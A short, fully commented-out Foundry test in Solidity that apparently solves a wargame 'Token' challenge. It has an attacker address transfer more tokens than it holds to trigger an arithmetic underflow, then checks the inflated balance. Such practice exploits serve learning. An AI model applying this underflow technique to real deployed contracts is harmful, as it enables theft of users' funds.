// // SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0; // 溢出

// import "forge-std/Test.sol";
// import {Token} from "../src/Token.sol";

// contract FalloutTest is Test {
//     Token token;
//     address owner;
//     address attacker;

//     function setUp() public {
//         token = new Token(10000);
//         owner = address(this);
//         attacker = address(0x123);

//         vm.deal(attacker, 20);
//     }

//     function test_transfer() public {
//         vm.startPrank(attacker);
//         token.transfer(attacker, 21);
//         console.log(token.balanceOf(attacker));
//         require(token.balanceOf(attacker) > 20);
//         vm.stopPrank();
//     }
// }

